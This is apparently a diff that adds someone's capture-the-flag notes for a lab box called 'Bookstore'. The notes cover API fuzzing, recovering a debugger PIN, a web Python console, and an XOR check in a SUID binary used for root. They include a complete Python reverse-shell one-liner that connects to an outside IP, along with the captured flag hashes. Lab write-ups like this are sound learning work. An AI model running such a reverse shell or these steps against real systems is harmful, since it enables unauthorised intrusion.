@@ -1,0 +1,64 @@
+Bookstore:
+nmap reveals
+22
+80
+5000
+Description says box is about web enumeration and REST API fuzzing
+5000
+visit webpage, found Foxy REST API v2.0
+off an idea I tried /api - found this explicitly in /robots.txt after
+lists a bunch of potential commands, all are listed as v2…
+try v1, it works
+maybe the vulnerability is in the earlier version?
+Try to fuzz both
+80
+After trying to do some API fuzzing, went to the login.html on normal website
+found this in html
+“Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file”
+Ah hah!
+
+API Fuzzing:
+Fuzz v1, found “show” as a command?
+not present in v2
+using information from 80, I can use this to show me .bash_history and get a PIN?
+PIN = 123-321-135
+now where do I use this…
+Even more fuzzing found /console
+prompts for a PIN…
+given a python prompt on the webpage
+
+Console (Webshell):
+try to make a python revshell
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.15.130",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+Pasted this into prompt, got a revshell
+user.txt
+4ea65eb80ed441adb68246ddf7b964ab
+
+User Shell (sid):
+bash
+export TERM=xterm-color
+found SUID binary “try-harder”
+Ok cool a reversing challenge
+
+Reversing:
+opened in Radare2, got some overview
+very simple, compares input to a hard coded number, if it matches you get shell
+decompiled with ghildra
+detailed steps are
+SUID
+“Prompt”
+Gathers Input
+math
+Evaluation
+Math
+simplified down to: where number, a, and b are local variables
+number = a ^ 0x1116 ^ b
+number = 0x5dcd21f4 ^ 0x116 ^ 0x5db3
+This is just a hexadecimal math equation, perfect for python
+1573743953
+tried locally and it worked
+tried on machine and it worked
+
+Root:
+e29b05fba5b2a7e69c24a450893158e3
+This was very hard, I know it says beginner but it relied on a lot of fuzzing and web in the beginning, then hit a 360 into reversing! I spent quite a bit of time on this.
